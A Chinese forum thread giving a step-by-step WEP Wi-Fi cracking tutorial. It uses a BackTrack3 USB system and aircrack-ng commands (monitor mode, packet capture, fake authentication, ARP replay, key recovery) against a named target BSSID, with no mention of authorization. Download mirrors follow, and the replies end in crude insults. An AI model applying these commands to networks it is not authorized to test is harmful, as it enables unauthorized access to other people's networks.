@@ -1,0 +1,79 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+破解WEP无线网络密码详细步骤
+D8888D主贴内容-------------------------------------------------------
+backtrack3(BT3) usb版 破解WEP无线网络密码详细步骤（附软件及中文包下载地址）
+一、先开始制作启动U盘：
+
+将下载好的backtrack3(BT3) usb版(下载地址在文章末尾)文件bt3b141207.rar直接解压到U盘（1G以上容量）。把Boot 和BT3两个文件夹放到U盘的根目录，打开BOOT文件夹双击运行" bootinst.bat "批处理文件。U盘里就会多出4个文件." isolinux.boot" "isolinux.cfg" "isolinux.bin " "syslinux.cfg" （如果想要中文截面的BT3的菜单,就在下载BT3中文语言包。下载地址：[url=http://file.mofile.com/cn/docs/listallfiles.do]链接标记http://file.mofile.com/cn/docs/listallfiles.do[/url] 提取密码：4871454552251231。（用的是免费的网络硬盘,广告较多,有些朋友可能没认真看没找到，我说下大概位置，输入提取码后,拉到中间找下面的几个字(红色的) 以下这三个链接后两个均可下载
+推荐快车（flashget）高速下载文件 下载文件(IE浏览器) 下载文件(非IE浏览器)
+）把压缩包里的"中文包"解压出来，将里面的*.lzm文件拷贝到u盘的BT3\modules目录，即可实现bt3中文化。）
+二、之后重启 windows 进入BIOS设置，把BIOS里的frist boot device设置为USB-HDD（或者是USB--ZIP）再重启选择从usb启动。系统进入backtrack3 系统。
+
+三、现在开始破解
+1.在shell窗口中输入 ifconfig 命令 ，出现如下信息：
+lo no wireless extensions.
+eth0 no wireless extensions.
+eth1 IEEE 802.11g ESSID:"" Nickname:""
+Mode:（......）Frequency:2.452 GHz Access Point: 00:0F:B5:88:AC:82 
+Bit Rate:0 kb/s Tx-Power:18 dBm Sensitivity=0/3 
+Retry:off RTS thr:off Fragment thr:off
+Encryption key:off
+Power Management:off
+Link Quality=0/94 Signal level=-95 dBm Noise level=-95 dBm
+Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0
+Tx excessive retries:0 Invalid misc:0 Missed beacon:0
+2.找出你的无线网卡名字，我这里是 eth1.再启动你的网卡为Moniter模式(输入airmon-ng start eth1 11)。再输入 ifconfig 命令 ，返回如下信息：
+lo no wireless extensions.
+eth0 no wireless extensions.
+eth1 IEEE 802.11g ESSID:"" Nickname:""
+Mode:Monitor Frequency:2.452 GHz Access Point: 00:0F:B5:88:AC:82 
+Bit Rate:0 kb/s Tx-Power:18 dBm Sensitivity=0/3 
+Retry:off RTS thr:off Fragment thr:off
+Encryption key:off
+Power Management:off
+Link Quality=0/94 Signal level=-95 dBm Noise level=-95 dBm
+Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0
+Tx excessive retries:0 Invalid misc:0 Missed beacon:0
+3. 输入命令 airodump-ng -c 11 --bssid 00:1A:01:8D:C3:B2 -w outputs eth1.
+命令中的11 表示要破解的频道号，bssid后面的数字表示破解目标的MAC物理地址，outputs表示要生成的包的名称。回车运行。
+4.再开一个 shell 输入 aireplay-ng -1 0 -e targetnet -a 00:1A:01:8D:C3:B2 -h 00:A1:C1:D8:A5:B6 eth1
+其中“targetnet”表示破解目标网络名,00:1A:01:8D:C3:B2前面已解释过是指目标MAC物理地址，00:A1:C1:D8:A5:B6表示本机网卡MAC物理地址
+5.再开一个 shell 输入 aireplay-ng -3 -b 00:1A:01:8D:C3:B2 -h 00:A1:C1:D8:A5:B6 eth1
+获取更多的数据包。
+6.返回数据量到1万的时候就可以破解了。再开一个shell输入 aircrack-ng -z -b 00:1A:01:8D:C3:B2 outputs.cap 进行破解。如果破解不成功，让它继续抓包，直到破解。
+
+
+BT3(backtrack3) usb版 下载地址列表
+backtrack3(BT3) usb版 下载地址列表：（自己选个快的镜像下）
+BT下载：
+Torrent: [url=http://www.remote-exploit.org/bt3b141207.rar.torrent]链接标记http://www.remote-exploit.org/bt3b141207.rar.torrent[/url]
+[url=http://www.offensive-security.com/bt3b141207.rar.torrent]链接标记http://www.offensive-security.com/bt3b141207.rar.torrent[/url]
+FTP下载：
+
+[url=ftp://ftp.heanet.ie/mirrors/backtrack/bt3b141207.rar]链接标记ftp://ftp.heanet.ie/mirrors/backtrack/bt3b141207.rar[/url]
+[url=ftp://ftp.cc.uoc.gr/mirrors/linux/backtrack/bt3b141207.rar]链接标记ftp://ftp.cc.uoc.gr/mirrors/linux/backtrack/bt3b141207.rar[/url]
+[url=ftp://backtrack.mirrors.skynet.be/pub/backtrack/bt3b141207.rar]链接标记ftp://backtrack.mirrors.skynet.be/pub/backtrack/bt3b141207.rar[/url]
+HTTP下载：
+[url=http://mirror.switch.ch/ftp/mirror/backtrack/bt3b141207.rar]链接标记http://mirror.switch.ch/ftp/mirror/backtrack/bt3b141207.rar[/url]
+[url=http://ftp.cc.uoc.gr/mirrors/linux/backtrack/bt3b141207.rar]链接标记http://ftp.cc.uoc.gr/mirrors/linux/backtrack/bt3b141207.rar[/url]
+[url=http://ftp.heanet.ie/mirrors/backtrack/bt3b141207.rar]链接标记http://ftp.heanet.ie/mirrors/backtrack/bt3b141207.rar[/url]
+[url=http://backtrack.mirrors.skynet.be/pub/backtrack/bt3b141207.rar]链接标记http://backtrack.mirrors.skynet.be/pub/backtrack/bt3b141207.rar[/url]
+[url=http://ftp.belnet.be/mirror/backtrack/bt3b141207.rar]链接标记http://ftp.belnet.be/mirror/backtrack/bt3b141207.rar[/url]
+[url=http://backtrack.mick27.info/bt3b141207.rar]链接标记http://backtrack.mick27.info/bt3b141207.rar[/url]
+
+这些影子叔和些朋友也教过我 但因为自己本本一直没无线网卡 新买的USB的不知道是什么芯的所以无法操作 
+
+  他们给我的是在linux下破解的还有些是在XP系统下破解的 但因为支持XP的网卡少之为少 工具OMNIPEEK，WIRESHARK等但是使用麻烦不如linux 看个人感觉
+
+D8888D回贴内容-------------------------------------------------------
+WEP破解分有client和无client的情况，方法细节有出入，bt3对atheros的网卡支持最好，不过用这种芯片的多数都是minipci的，你可以考虑弄个zydas，也就是zb1211芯片或者rtl8187的，这种usb网卡较多，自己改改加天线也方便
+
+D8888D回贴内容-------------------------------------------------------
+啊，日空空
+
+D8888D回贴内容-------------------------------------------------------
+日 顶楼上的！
+
+  楼下的梅毒治好没
